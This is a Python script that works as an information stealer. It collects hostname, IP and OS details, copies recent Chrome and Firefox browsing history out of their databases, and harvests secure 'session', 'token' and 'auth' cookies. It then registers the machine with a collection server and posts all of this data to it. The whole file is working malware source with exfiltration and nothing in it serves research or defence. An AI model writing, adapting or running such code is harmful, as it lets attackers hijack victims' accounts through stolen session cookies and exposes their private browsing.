import os
import sys
import json
import uuid
import socket
import sqlite3
import platform
import requests
import browser_cookie3
import psutil
from datetime import datetime, timedelta

SERVER_URL = "http://127.0.0.1:5000"
MACHINE_ID = str(uuid.getnode())

# ========== INFO GATHERING ==========
def get_system_info():
    return {
        "machine_id": MACHINE_ID,
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "os_info": f"{platform.system()} {platform.release()}"
    }

# ========== BROWSER HISTORY ==========
def extract_chrome_history():
    path = os.path.expanduser("~/.config/google-chrome/Default/History") if platform.system() == "Linux" else None
    if not path or not os.path.exists(path): return []
    temp = f"/tmp/chrome_history_{uuid.uuid4()}"
    os.system(f"cp '{path}' '{temp}'")
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
    history = [
        {
            "url": url,
            "title": title,
            "visit_time": (datetime(1601,1,1)+timedelta(microseconds=ts)).isoformat(),
            "browser_type": "chrome"
        } for url, title, ts in cursor.fetchall()
    ]
    conn.close(); os.remove(temp)
    return history

def extract_firefox_history():
    profile_dir = os.path.expanduser("~/.mozilla/firefox")
    if not os.path.exists(profile_dir): return []
    profile = next((p for p in os.listdir(profile_dir) if 'default' in p), None)
    if not profile: return []
    path = os.path.join(profile_dir, profile, 'places.sqlite')
    temp = f"/tmp/firefox_history_{uuid.uuid4()}"
    os.system(f"cp '{path}' '{temp}'")
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT url, title, visit_date
        FROM moz_places JOIN moz_historyvisits
        ON moz_historyvisits.place_id = moz_places.id
        ORDER BY visit_date DESC LIMIT 100
    """)
    history = [
        {
            "url": url,
            "title": title,
            "visit_time": datetime.fromtimestamp(ts / 1_000_000).isoformat(),
            "browser_type": "firefox"
        } for url, title, ts in cursor.fetchall()
    ]
    conn.close(); os.remove(temp)
    return history

def get_browser_history():
    return extract_chrome_history() + extract_firefox_history()

# ========== CREDENTIALS ==========
def get_saved_credentials():
    credentials = []
    for cookie in browser_cookie3.chrome():
        if cookie.secure and cookie.name.lower() in ("session", "token", "auth"):
            credentials.append({
                "website": cookie.domain,
                "username": cookie.name,
                "password": cookie.value,
                "browser_type": "chrome"
            })
    for cookie in browser_cookie3.firefox():
        if cookie.secure and cookie.name.lower() in ("session", "token", "auth"):
            credentials.append({
                "website": cookie.domain,
                "username": cookie.name,
                "password": cookie.value,
                "browser_type": "firefox"
            })
    return credentials

# ========== DATA TRANSMISSION ==========
def register_machine():
    try:
        r = requests.post(f"{SERVER_URL}/register", json=get_system_info())
        return r.ok
    except requests.RequestException:
        return False

def send_data():
    if not register_machine():
        return
    try:
        requests.post(f"{SERVER_URL}/submit/history", json={
            "machine_id": MACHINE_ID,
            "history": get_browser_history()
        })
        requests.post(f"{SERVER_URL}/submit/credentials", json={
            "machine_id": MACHINE_ID,
            "credentials": get_saved_credentials()
        })
    except requests.RequestException:
        pass

# ========== MAIN ==========
if __name__ == "__main__":
    send_data()
